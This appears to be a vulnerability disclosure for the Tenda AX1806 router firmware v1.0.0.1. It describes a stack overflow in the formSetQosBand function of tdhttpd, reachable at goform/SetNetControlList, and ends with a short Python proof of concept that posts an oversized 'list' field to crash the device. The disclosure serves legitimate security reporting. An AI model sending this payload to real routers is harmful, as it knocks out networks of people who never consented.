## Overview

- The device's official website: https://www.tenda.com.cn/product/AX1806.html
- Firmware download website: https://www.tenda.com.cn/download/detail-3306.html

## Affected version

v1.0.0.1

## Vulnerability details

tdhttpd in directory /bin has stack overflow vulnerability. The vulnerability occurrs in the `formSetQosBand` function, which can be accessed via the URL `goform/SetNetControlList`.  

<img src="img/image-20220526203615461.png" alt="image-20220526203615461" style="zoom:50%;" />

<img src="img/image-20220526203642063.png" alt="image-20220526203642063" style="zoom:50%;" />

## PoC

Poc of Denial of Service(DoS)

```python
import requests

data = {
    b"list": b'A'*0x400+b'\n'
}
res = requests.post("http://127.0.0.1/goform/SetNetControlList", data=data)
print(res.content)
```

